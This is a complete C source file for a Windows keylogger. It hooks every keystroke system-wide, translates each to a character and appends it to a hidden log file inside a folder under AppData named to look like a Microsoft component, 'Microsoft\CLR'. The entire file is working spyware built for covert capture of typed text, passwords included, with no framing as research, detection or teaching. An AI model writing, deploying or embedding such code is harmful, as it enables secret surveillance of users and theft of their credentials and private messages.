#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <shlobj.h> // For SHGetFolderPath



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void SaveToLogFile(char c);
char TranslateKey(DWORD vkCode);
HHOOK hHook;


void SaveToLogFile(char c) {
    char path[MAX_PATH];

    // Get path to AppData
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
    strcat(path, "\\Microsoft\\CLR");

    // Make sure the folder exists
    CreateDirectory(path, NULL);
    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);

    // Append the file name
    strcat(path, "\\logs.txt");

    // Open file in append mode
    FILE *file = fopen(path, "a+");
    if (file) {
        fputc(c, file); // Save one character
        fclose(file);
    }

    // Hide the file itself
    SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
}

char TranslateKey(DWORD vkCode) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WORD ascii;
    if (ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &ascii, 0) == 1) {
        return (char)ascii;
    }

    return 0;
}



LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char c = TranslateKey(p->vkCode);
        if (c != 0 && isprint(c)) {
            SaveToLogFile(c);
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
